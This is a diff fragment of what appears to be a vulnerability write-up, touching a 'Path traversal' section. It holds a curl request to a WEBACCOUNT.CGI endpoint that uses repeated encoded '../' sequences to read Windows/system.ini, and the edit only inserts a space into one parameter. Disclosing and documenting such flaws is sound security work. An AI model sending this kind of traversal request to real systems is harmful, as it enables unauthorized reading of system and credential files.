@@ -178,7 +178,7 @@ Path traversal
 pathtraversal.png
 
 ```
-curl 'http://192.168.181.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=%22' -o path-traversal.html
+curl 'http://192.168.181.179:8080/WEBACCOUNT.CGI?OkBtn=++O k++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=%22' -o path-traversal.html
 ```
 
 activeXprivescmaybethen.png
